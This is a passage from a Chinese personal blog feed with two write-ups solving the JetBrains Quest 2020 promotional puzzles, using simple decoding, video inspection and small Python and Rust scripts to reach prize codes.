        <content type="html"><![CDATA[<h2 id="Cause"><a href="#Cause" class="headerlink" title="Cause"></a>Cause</h2><p>晚上看到 JetBrains 最后一个 Quest 出来了，于是继续来解个谜吧！</p><p>前两个 JetBrainsQuest 的 WriteUp 在这里↓呢。</p><p><a href="https://miaotony.xyz/2020/03/12/CTF_2020JetBrainsQuest/"><strong>CTF | JetBrains Quest 1&amp;2 WriteUp/攻略</strong></a> </p><p>这次的难度比上次要大一些，不过总体而言也不太难啦。</p><blockquote><p>ATTENTION! </p><p style="color:red">下面的内容 <strong>涉及剧透</strong>！</p><p><strong>如果想自己做的话，就暂时不要往下看了！</strong></p></blockquote><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>推特地址：</p><p><a href="https://twitter.com/jetbrains/status/1238420744817782784" target="_blank" rel="noopener">https://twitter.com/jetbrains/status/1238420744817782784</a></p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Quest3.png" alt="Quest 3"></p><p>噫！这是最后一个 quest 了！来解密吧~</p><blockquote><p>SGF2ZSB5b3Ugc2VlbiB0aGUgcG9zdCBvbiBvdXIgSW5zdGFncmFtIGFjY291bnQ/</p></blockquote><p>base64 解密得到</p><blockquote><p>Have you seen the post on our Instagram account?</p></blockquote><p>去 Instagram 找找线索。</p><br><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>前往 JetBrains 的Ins： <a href="https://www.instagram.com/jetbrains/" target="_blank" rel="noopener">https://www.instagram.com/jetbrains/</a></p><p>第一张图就是熟悉的 Quest 领取福利的页面背景了。</p><p>（留个<a href="https://www.instagram.com/p/B9q-CnhoUVl/" target="_blank" rel="noopener">备份链接</a></p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Step2.png" alt="Ins"></p><blockquote><p>Welcome to the final Quest! You should start on the Kotlin Playground: <a href="https://jb.gg/kotlin_quest" target="_blank" rel="noopener">https://jb.gg/kotlin_quest</a><br>P.S. If you don’t know about the #JetBrainsQuest, it’s not too late to find out.</p></blockquote><p>得到一个网址：<a href="https://jb.gg/kotlin_quest" target="_blank" rel="noopener">https://jb.gg/kotlin_quest</a></p><br><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>访问上面的网址，发现跳转又跳转，最终来到了一个 <strong>Kotlin 在线编程页面</strong>。</p><p>就是他说的 <code>the Kotlin Playground</code> 吧。</p><p>地址<a href="https://play.kotlinlang.org/#eyJ2ZXJzaW9uIjoiMS4zLjUwIiwiY29kZSI6ImZ1biBtYWluKCkge1xuICAgdmFsIHMgPSBcIlpoI2tkeWgjZWhocSN6cnVubHFqIzU1MjojcnEjd2toI3lsZ2hyI2lydSN3a2gjaWx1dncjaHNsdnJnaCNyaSN3a2gjU2tzVndydXAjSERTMSNMaSN6aCNqZHloI3xyeCNkI2ZveGgvI2x3I3pyeG9nI2VoI2hkdnwjZHYjc2wxXCJcblxuICAgIHZhbCBuOiBJbnQgPSBUT0RPKClcbiAgIGZvciAoYyBpbiBzKSB7XG4gICAgICAgcHJpbnQoYyAtIG4pXG4gICB9XG59IiwicGxhdGZvcm0iOiJqYXZhIiwiYXJncyI6IiJ9" target="_blank" rel="noopener">在这里</a> （链接太长了就不显示出来好了</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Step3.png" alt="Step3"></p><pre class=" language-kotlin"><code class="language-kotlin"><span class="token keyword">fun</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">val</span> s <span class="token operator">=</span> <span class="token string">"Zh#kdyh#ehhq#zrunlqj#552:#rq#wkh#ylghr#iru#wkh#iluvw#hslvrgh#ri#wkh#SksVwrup#HDS1#Li#zh#jdyh#|rx#d#foxh/#lw#zrxog#eh#hdv|#dv#sl1"</span>    <span class="token keyword">val</span> n<span class="token operator">:</span> Int <span class="token operator">=</span> <span class="token function">TODO</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token keyword">for</span> <span class="token punctuation">(</span>c <span class="token keyword">in</span> s<span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token function">print</span><span class="token punctuation">(</span>c <span class="token operator">-</span> n<span class="token punctuation">)</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>这个含义很明显呢。就是把字符串 <code>s</code> 每个字母往前移动 n 个字符好了。（i.e. SHIFTx，凯撒密码之类的）</p><p>我也不记得 n 是多少了emmm，反正个位数吧，试一试就出来了。</p><p>于是得到</p><pre><code>We have been working 22/7 on the video for the first episode of the PhpStorm EAP. If we gave you a clue, it would be easy as pi.</code></pre><p>关键词：<strong>video</strong>，<strong>PhpStorm EAP</strong>，<strong>pi</strong>。</p><p>盲猜就与 3.14/3.1415926 之类的有关。</p><br><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>搜索 <strong>PhpStorm EAP</strong>，来到了<a href="https://www.jetbrains.com/phpstorm/nextversion/" target="_blank" rel="noopener">他的网站</a>。</p><p>噢这是个 PHP 的 IDE 啊。EAP 相当于预发布版本？</p><blockquote><p><strong>PhpStorm Early Access Program</strong></p><p>At JetBrains, we believe that to make great tools for developers, we should listen to and involve developers. Our Early Access Program (EAP) lets our development community participate in the product discussions and influence development planning, from the very early stages.</p></blockquote><p>在页面上没有找到 <code>quest</code>，也没找到视频及其链接，看了一下最新的版本是 <code>2020.1 EAP build 201.6251.26 Released: March 12, 2020</code>。</p><p>看了一下 <strong>Blog &amp; Social</strong>，来到 PHPSTORM 的 <a href="https://blog.jetbrains.com/phpstorm/" target="_blank" rel="noopener">blog</a>，看到了最新版本发布的 Post。</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/PhpStorm_Blog.png" alt="PhpStorm Blog"></p><p>好了，有视频链接了！<a href="https://www.youtube.com/playlist?list=PLQ176FUIyIUb7qSArPCxOkIGX-cqdfoBx" target="_blank" rel="noopener"><em>What’s Coming in PhpStorm 2020.1</em></a></p><p>在 What’s Coming in PhpStorm 2020.1 – EAP Series | Season 2020.1 Episode 1 这个视频里，重点关注 PI 即 3’14’’ 附近的内容。</p><p>发现画面抖动了两下 emmm 有猫腻！ </p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Step4.png" alt="video"></p><p>猜想线索藏在抖动的位置，然而看了几遍，甚至开到最慢的 0.25 倍速，都没看出来 emmm<em>（好菜啊</em></p><p>于是找了个工具把这个视频下载下来，放 Premiere 里逐帧看。</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Step4_PR.png" alt="Premiere"></p><p>裁剪了，放大再看这1秒多的片段。最后发现 <code>homepage</code> 这里发生了变化。</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Step4_homepage.png" alt="homepage变化"></p><p>原来他的意思是 clue 在这两段抖动之间啊！</p><p>于是得到下一个链接：<a href="https://jb.gg/31415926" target="_blank" rel="noopener">https://jb.gg/31415926</a></p><p>的确与 PI 有关呢（</p><blockquote><p>有意思的是，<strong>这个视频2月10日就发布了</strong>，真是蓄谋已久啊 233333.</p><p>看评论区还有人一个月前疑惑呢。</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Step4_comments.png" alt="comments"></p></blockquote><br><h2 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h2><p>访问 <a href="https://jb.gg/31415926" target="_blank" rel="noopener">https://jb.gg/31415926</a></p><p>301跳转到 <a href="https://www.quiz-maker.com/Q2723CE" target="_blank" rel="noopener">https://www.quiz-maker.com/Q2723CE</a></p><p>（发现这个 <a href="http://www.quiz-maker.com" target="_blank" rel="noopener">www.quiz-maker.com</a> 是个挺不错的在线 quiz 网站呢</p><blockquote><p><strong>The Easiest #1 Rated Online Quiz Maker</strong></p><p>Publish your quiz in a matter of minutes. Go ahead Try it now!</p></blockquote><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Step5.png" alt="Step5"></p><p>然后需要你在 1min 内回答关于 JB 的一些问题。</p><p>（真挺好，顺便宣传一下自己。</p><p>做不对再重来，然后发现每次还有新的题目（黑脸</p><p>然后我做了好多次，发现谷歌搜索的 精选摘要 真的好用。</p><p>最后终于全对了。</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Step5_2.png" alt="Step5_2"></p><blockquote><p>Almost there! The last challenge is in the <em>Tips of the Day</em> of a specific IntelliJ IDEA Community version from our latest build page in Confluence, but… there is a catch. You have to know which version to look for. To find the build number, you need sight beyond sight:</p><p>. Not Everything Today Does All You Could Ask. Lessons Learned From Other Relevant Solutions, Possibly Even Another Kind Emerge. Risking Sometimes Being Liberal Or Generous Proves Ordinary Simple Tests Infinitely More Annoying. Get Examining Hidden Initial Designated Early Symbols. They Have Everything Needed, Except Xerox, To Completely Level Up Everything.</p></blockquote><p>看来与 <em>Tips of the Day</em> of a specific IntelliJ IDEA Community version 有关，藏在每日提示里可还行，而且还是一个神秘的版本。这个版本部署在 Confluence 上面。</p><p>下面这段话有点摸不着头脑。</p><p>不管了先去 IDEA 网站上看看，难道顺便骗一波下载量？？？</p><br><h2 id="Step-6"><a href="#Step-6" class="headerlink" title="Step 6"></a>Step 6</h2><p>访问 IDEA 官网，顺着 Release Notes，来到了<a href="https://confluence.jetbrains.com/collector/pages.action?key=IDEADEV" target="_blank" rel="noopener">这里</a>。</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Step6.png" alt="Step6"></p><p>第一个就是吧。还是几个小时前刚发布的呢！</p><p>就是这个：<a href="https://confluence.jetbrains.com/display/IDEADEV/IDEA+2020.1+Quest+Build+Edition" target="_blank" rel="noopener">IDEA 2020.1 Quest Build Edition</a></p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Step6_QuestBuildEdition.png" alt="Step6_QuestBuildEdition"></p><p>下载下来而后安装。什么，1.4GB？？？</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/IEDA_Setup.png" alt="IEDA_Setup"></p><p>随便了随便了，装完卸掉好了。（不过听说用来写 Java 挺好用的</p><p><em>（估计这里还能引一波流呢</em></p><br><h2 id="Step-7"><a href="#Step-7" class="headerlink" title="Step 7"></a>Step 7</h2><p>装好了随意建一个项目，唤出 Tip of the Day.</p><p>翻了几页之后找到了。</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Step7.png" alt="Tip of the Day"></p><blockquote><p><strong>JETBRAINS QUEST</strong>: LAST PUZZLE</p><p><em>You have discovered our JetBrains Quest! If you don’t know what this is, you should start from the beginning.</em></p><p>This is it. The last puzzle. You are just one step away from glory!<br>Now you just need the Key to unlock the Quest page.<br>The Key is the first and last 4 digits of the 50 * 10^6 position of the Fibonacci sequence (F(50 Million)).<br>As you may know by now, not all that glitters is gold, and to solve this puzzle you should not go straight for the obvious answer. May you make a glorious choice.  </p><p>Remember that you have until the 15th of March 12:00 CEST.</p></blockquote><p>所以这里要找到 <strong>the first and last 4 digits of the 50 * 10^6 position of the Fibonacci sequence (F(50 Million))</strong></p><p>即 <strong>Fibonacci 数列 50×10^6 位置的前4位和后4位</strong>。</p><p>Quest Page 就是之前的 <a href="https://www.jetbrains.com/promo/quest/" target="_blank" rel="noopener">https://www.jetbrains.com/promo/quest/</a></p><br><h2 id="Beat-the-Quest"><a href="#Beat-the-Quest" class="headerlink" title="Beat the Quest"></a>Beat the Quest</h2><p>那就算吧，前四位好算，后四位有点难顶。</p><p>搜了一下Google发现出不来。</p><p>不过懒得手撸代码算了，直接找 <a href="https://www.wolframalpha.com/" target="_blank" rel="noopener">wolframalpha</a> 吧！</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/wolframalpha.png" alt="wolframalpha"></p><p>前四位是4602。后四位的话，mod 10000出结果。</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/wolframalpha2.png" alt="wolframalpha2"></p><p>得到后四位为3125。</p><p>于是 Code 就是 <code>46023125</code>啦！</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/BeatTheQuest.png" alt="BeatTheQuest"></p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/ComeToAnEnd.png" alt="ComeToAnEnd"></p><p>所以最终得到的是 <strong>JB 家全家桶八折券</strong> emmmm </p><p><del>（还以为是六个月授权凑成一年的呢</del></p><p><em>不管了，反正本来就有教育授权不差这个（</em></p><p><strong>好玩就行了 23333</strong></p><p>如果你需要的话，<strong>Remember that you have until the 15th of March 12:00 CEST.</strong></p><br><h2 id="再看-Step-5-中的-Clue"><a href="#再看-Step-5-中的-Clue" class="headerlink" title="再看 Step 5 中的 Clue"></a>再看 Step 5 中的 Clue</h2><p>本来本文到这里就结束了，然后想起来之前的 clue 有点想不通，再来看看。</p><blockquote><p>. Not Everything Today Does All You Could Ask. Lessons Learned From Other Relevant Solutions, Possibly Even Another Kind Emerge. Risking Sometimes Being Liberal Or Generous Proves Ordinary Simple Tests Infinitely More Annoying. Get Examining Hidden Initial Designated Early Symbols. They Have Everything Needed, Except Xerox, To Completely Level Up Everything.</p></blockquote><p>看了一些 V2EX 上的讨论，发现只看首字母可以拼出一句话。</p><blockquote><p>.net day call for speakers blog post image hides the next clue</p></blockquote><p>搜了一下，来到了这里。</p><p><a href="https://blog.jetbrains.com/dotnet/2020/02/13/jetbrains-net-day-online-2020-call-speakers/" target="_blank" rel="noopener">JetBrains .NET Day Online 2020 – Call for Speakers</a></p><p>在这张图片这里找到了线索。（噗</p><p><strong>you_are_looking_for_build_201-6303</strong></p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/you_are_looking_for_build_201-6303.png" alt="you_are_looking_for_build_201-6303"></p><p>不过问题不大2333. 反正也找到了呢。</p><br><h2 id="Extensive-Reading"><a href="#Extensive-Reading" class="headerlink" title="Extensive Reading"></a>Extensive Reading</h2><p>再看了看<a href="https://www.v2ex.com/t/652589" target="_blank" rel="noopener">大佬们的讨论</a>，发现有大佬用 rust 写了个 <a href="https://play.rust-lang.org/?version=stable&amp;mode=release&amp;edition=2018&amp;gist=b66221ebd69b64d63feb1fe46631957b" target="_blank" rel="noopener">jio本</a> 算出了后四位。</p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/Script_Rust.png" alt="Script_Rust"></p><pre class=" language-rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> a2<span class="token punctuation">:</span> u128 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> a1<span class="token punctuation">:</span> u128 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">3</span><span class="token punctuation">..</span><span class="token operator">=</span><span class="token number">50000000</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//for i in 3..=50 {</span>        <span class="token keyword">let</span> new <span class="token operator">=</span> a2 <span class="token operator">+</span> a1<span class="token punctuation">;</span>        a2 <span class="token operator">=</span> a1<span class="token punctuation">;</span>        <span class="token keyword">if</span> new <span class="token operator">></span> <span class="token number">10000</span> <span class="token punctuation">{</span>            a1 <span class="token operator">=</span> new <span class="token operator">%</span> <span class="token number">10000</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            a1 <span class="token operator">=</span> new<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">10000</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{</span>            <span class="token function">print!</span><span class="token punctuation">(</span><span class="token string">"\r[{}]"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">println!</span><span class="token punctuation">(</span><span class="token string">"\nok: {}"</span><span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>他的思路是：</p><blockquote><p>后四位我自己写程序跑，超过四位数就减掉一万，等于只算最后四位。</p></blockquote><p>还有大佬发现了 Fib 数列是有规律的↓。</p><p><a href="http://www.maths.surrey.ac.uk/hosted-sites/R.Knott/Fibonacci/fibmaths.html#section1.1" target="_blank" rel="noopener">http://www.maths.surrey.ac.uk/hosted-sites/R.Knott/Fibonacci/fibmaths.html#section1.1</a></p><p>etc.</p><br><hr><br><h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p>今天是 PI 日，节日快乐呀！</p><p>最近<strong>对博客进行了一些优化</strong>，或者说是除草了，懒得开新文章写了。</p><p>主要让常用的 JavaScript、CSS、一些背景图片走 jsdelivr 的 cdn，优化一点加载速度。</p><p>然后修改了 hexo 的 feed 插件，把 RSS 中的 <code>summary</code> 优化为了文章的摘要（原来是截取全文最开始的一部分文字，还保留着一堆标签，丑死了）。期间还发现报错了，后来去 Github 参考了大佬们更新的源码改了一下模板。</p><p>这样 RSS 的效果就好多了。</p><p>欢迎大佬们关注，和我交换友链呀！</p><p><strong>RSS 地址</strong>：<a href="https://miaotony.xyz/atom.xml">https://miaotony.xyz/atom.xml</a></p><p><img src="/2020/03/14/CTF_2020JetBrainsQuest3/rss.png" alt="rss"></p><p><del>（感觉越写越水了</del></p><p>（溜了溜了</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | JetBrains Quest 1&amp;2 WriteUp/攻略</title>
      <link href="/2020/03/12/CTF_2020JetBrainsQuest/"/>
      <url>/2020/03/12/CTF_2020JetBrainsQuest/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨晚在 Telegram 里看到朋友发了一个 JetBrains Quest 的 twitter 链接，据说难度不大，还可以白嫖他家的产品授权。</p><p>感兴趣就来体验一下吧！</p><p>于是体验了 Quest1 和 2 白嫖了 3+3 个月的 JB 家全产品授权，这里记录一下<strong>通关过程</strong>，也算是<strong>攻略 / WriteUp</strong> 吧。</p><p>感觉也是 CTF, Capture The Flag 的范畴吧，暂且就归类为 CTF 好了（</p><p>欢迎来和我交流哈。</p><blockquote><p><strong>PAY ATTENTION! 注意！</strong></p><p>如果没有玩过的话</p><p style="color:red">本文下面的内容 <strong>全 是 剧 透</strong>！</p><p><strong>如果想自己做的话，就暂时不要往下看了！</strong></p></blockquote><p>这个 Quest <strong>在 2020-03-15 12:00 CET （欧洲中部时间）之前都有效</strong>。</p><br><h2 id="Quest-1"><a href="#Quest-1" class="headerlink" title="Quest 1"></a>Quest 1</h2><p><a href="https://twitter.com/jetbrains/status/1236986174075482113" target="_blank" rel="noopener">https://twitter.com/jetbrains/status/1236986174075482113</a></p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Quest1.png" alt="Quest1"></p><pre><code>48 61 76 65 20 79 6f 75 20 73 65 65 6e 20 74 68 65 20 73 6f 75 72 63 65 20 63 6f 64 65 20 6f 66 20 74 68 65 20 4a 65 74 42 72 61 69 6e 73 20 77 65 62 73 69 74 65 3f</code></pre><p>一看是 hex，于是转成 ASCII，得到：</p><pre><code>Have you seen the source code of the JetBrains website?</code></pre><br><h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h3><p>去官网上找呗。传送门：<a href="https://www.jetbrains.com/" target="_blank" rel="noopener">https://www.jetbrains.com/</a></p><p>（还别说，挺久没上 JetBrains 官网了，感觉又多了不少工具，界面也变得更好看了唉。</p><p>提示了看源码，既然是 <code>JetBrainsQuest</code> 了，当然就<strong>搜一下<code>quest</code></strong>。</p><p>果然看到了提示。</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Step1-1.png" alt="Step1"></p><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--      O{o)xxx|===============-      OWelcome to the JetBrains Quest.What awaits ahead is a series of challenges. Each one will require a little initiative, a little thinking, and a whole lot of JetBrains to get to the end. Cheating is allowed and in some places encouraged. You have until the 15th of March at 12:00 CET to finish all the quests.Getting to the end of each quest will earn you a reward.Let the quest commence!JetBrains has a lot of products, but there is one that looks like a joke on our Products page, you should start there... (hint: use Chrome Incognito mode)It’s dangerous to go alone take this key: Good luck! == Jrrg#oxfn$                 O-===============|xxx(o}                 O--></span></code></pre><p>这里提示了<code>hint: use Chrome Incognito mode</code>。</p><p><strong>建议用 Chrome 的无痕模式。</strong></p><br><h3 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h3><p>于是就<strong>去 products 里找</strong>了呗。</p><p>（可能没注意）没找到入口，盲猜就在 <code>/products</code> 目录了，访问后跳转到了 <a href="https://www.jetbrains.com/products.html" target="_blank" rel="noopener">https://www.jetbrains.com/products.html</a> 。</p><blockquote><p>后来发现主页上的链接在 <a href="https://www.jetbrains.com/products.html" target="_blank" rel="noopener">See All Tools</a> 里（</p></blockquote><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/products.png" alt="products"></p><p>找找哪个<code>looks like a joke</code>，一猜就是 <strong>JK</strong> 了，而且还是2020.1.1版本（嘻嘻 。</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Step1-2.png" alt="Step2"></p><blockquote><p>后来发现，JK 这个产品可能需要在 <strong>无痕模式/隐私模式</strong> 下才出现。（有可能有缓存？</p><p>后面再来分析一下这个怎么加载出来的8.</p></blockquote><br><h3 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h3><p><strong>找一下 500 到 5000 之内有多少素数</strong>，随手写个 py 的 jio 本。</p><p>（边界值的话，5000肯定不是素数，不影响结果</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> math <span class="token keyword">import</span> sqrtcnt <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>sqrt<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">%</span> j <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">if</span> j <span class="token operator">==</span> int<span class="token punctuation">(</span>sqrt<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            cnt <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'OK!'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>cnt<span class="token punctuation">)</span></code></pre><p>跑出来 <code>cnt</code> 为 574.</p><p>于是访问 <a href="https://jb.gg/574" target="_blank" rel="noopener">https://jb.gg/574</a> .<em>（不输入的话是跳转到官网的</em></p><p><em>（其实爆破也行，反正就三位数呢</em></p><p>发现 301 重定向到了 <a href="https://www.jetbrains.com/help/pycharm/getting-help.html#quest" target="_blank" rel="noopener">https://www.jetbrains.com/help/pycharm/getting-help.html#quest</a> 。</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Step1-3.png" alt="Step3"></p><br><h3 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h3><p>Google 上一搜就是了。</p><p>（下面还有 V2EX 上别人的讨论 </p><p><small><em>（（不看不看先不看！</em></small></p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/MPS-31816.png" alt="MPS-31816"></p><p><a href="https://youtrack.jetbrains.com/issue/MPS-31816" target="_blank" rel="noopener">https://youtrack.jetbrains.com/issue/MPS-31816</a></p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Step1-4.png" alt="Step4"></p><p>这是 YouTrack 的一个 issue。<em>（这里直接谷歌可能是非预期解了</em></p><pre><code>JetBrains Quest“The key is to think back to the beginning.” – The JetBrains Quest teamQlfh$#Li#|rx#duh#uhdglqj#wklv#|rx#pxvw#kdyh#zrunhg#rxw#krz#wr#ghfu|sw#lw1#Wklv#lv#rxu#lvvxh#wudfnhu#ghvljqhg#iru#djloh#whdpv1#Lw#lv#iuhh#iru#xs#wr#6#xvhuv#lq#Forxg#dqg#iru#43#xvhuv#lq#Vwdqgdorqh/#vr#li#|rx#zdqw#wr#jlyh#lw#d#jr#lq#|rxu#whdp#wkhq#zh#wrwdoo|#uhfrpphqg#lw1#|rx#kdyh#ilqlvkhg#wkh#iluvw#Txhvw/#qrz#lw“v#wlph#wr#uhghhp#|rxu#iluvw#sul}h1#Wkh#frgh#iru#wkh#iluvw#txhvw#lv#‟WkhGulyhWrGhyhors†1#Jr#wr#wkh#Txhvw#Sdjh#dqg#xvh#wkh#frgh#wr#fodlp#|rxu#sul}h1#kwwsv=22zzz1mhweudlqv1frp2surpr2txhvw2</code></pre><p>结合 Step1 中的 <code>Good luck! == Jrrg#oxfn$</code>，分析可知是<strong>往后移了3个字符（SHIFT3）</strong>。</p><p>于是全部往前移3个字符得到：</p><pre><code>Nice! If you are reading this you must have worked out how to decrypt it. This is our issue tracker designed for agile teams. It is free for up to 3 users in Cloud and for 10 users in Standalone, so if you want to give it a go in your team then we totally recommend it. you have finished the first Quest, now it…s time to redeem your first prize. The code for the first quest is &lt;TheDriveToDevelop&lt;. Go to the Quest Page and use the code to claim your prize. https://www.jetbrains.com/promo/quest/</code></pre><br><h3 id="Beat-The-Quest"><a href="#Beat-The-Quest" class="headerlink" title="Beat The Quest"></a>Beat The Quest</h3><p>Rua！哇好耶！</p><p><code>TheDriveToDevelop</code></p><p>然后就可以拿着这个 code 去白嫖免费授权了！</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/success.png" alt="success"></p><p>输入邮箱和上面的 Code，提交就好啦。</p><blockquote><p>这里看到 Twitter 上有人说 Firefox 会报 CORS issue，请使用 Chrome 试试。</p><p><em>(An error occurred while …</em></p></blockquote><p>这里说了会把你的信息提供给他，他会给你的邮箱发推荐信息，可能这是 JetBrains 吸收流量的一个手段吧<em>（盲猜的</em></p><p>不过他也说了在邮件末尾可以取消订阅。</p><blockquote><p>BTW，发现这里的 Code 并没有上传到后端进行校验，而是直接在前端进行的。</p><p><em>可以给 Code 输入框的 input 打个断点看看（</em></p><p><em>（或者看看提交表格的 call stack 好了</em></p></blockquote><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/success2.png" alt="success2"></p><p>于是得到了白嫖的 <strong>3-months free All Products Pack subscription</strong>。</p><p>有点意思唉~</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/success3.png" alt="success3"></p><p>等等？<strong>还没完唉！</strong></p><p><strong>这是一系列的 Quest！</strong></p><p>下一个 quest 的时间是<strong>1583924400</strong>，转换时间戳发现是 <strong>2020-03-11 19:00:00</strong>.</p><p><br><br></p><h3 id="Step2-中-JK-的加载分析"><a href="#Step2-中-JK-的加载分析" class="headerlink" title="Step2 中 JK 的加载分析"></a>Step2 中 JK 的加载分析</h3><p>突然有点好奇这个 JK 是怎么被加载出来的，于是简单分析一下吧。</p><p>这里搜索<code>quest</code>，在网页末尾处看到了一个加载的<code>dialog-polyfill.js</code>。</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/JK_Analysis.png" alt="Elements"></p><p>在 Sources 里这个文件里搜索 <code>JK</code>或者<code>quest</code>，都找不到网页上与 JK 有关信息，倒是定义了一堆相关的属性方法之类的，css 文件中是<code>dialog</code>框的相关样式。</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/JK_Analysis2.png" alt="dialogJS"></p><p>在 Network 里看 <code>products.html</code> 的 response，里面并没有 <code>JK</code>，也没有<code>quest</code>。就连上面这个脚本文件也没有。</p><p><strong>那这个 JK 到底是怎么加载出来的呢？</strong></p><p>于是<strong>在 Network 里全局搜索了一下 <code>quest</code></strong>，有了新的收获。</p><p>原来这些信息都是<strong>通过一个JS脚本来加载</strong>的。</p><p>这个 js 的 response 包含了页面上的所有产品信息，是把网页内容嵌入到 json 里进行数据交互的。</p><p>哇，第一次见唉！😂</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/JK_Analysis3.png" alt="Network"></p><p>再看一下 Initiator，发现调用了 Googletagmanager，这是什么东西唉，之前爬虫虫也没遇到过（又是我知识盲区了</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/JK_Analysis4.png" alt="call stack"></p><p>查了一下，是谷歌的标签管理器，都诞生挺久了然而并不知道。</p><blockquote><p><em>Google Tag Manager</em> helps make website tag management simple with tools &amp; solutions that allow small businesses to deploy and edit tags all in one place.</p><p>这里是<a href="https://tagmanager.google.com/" target="_blank" 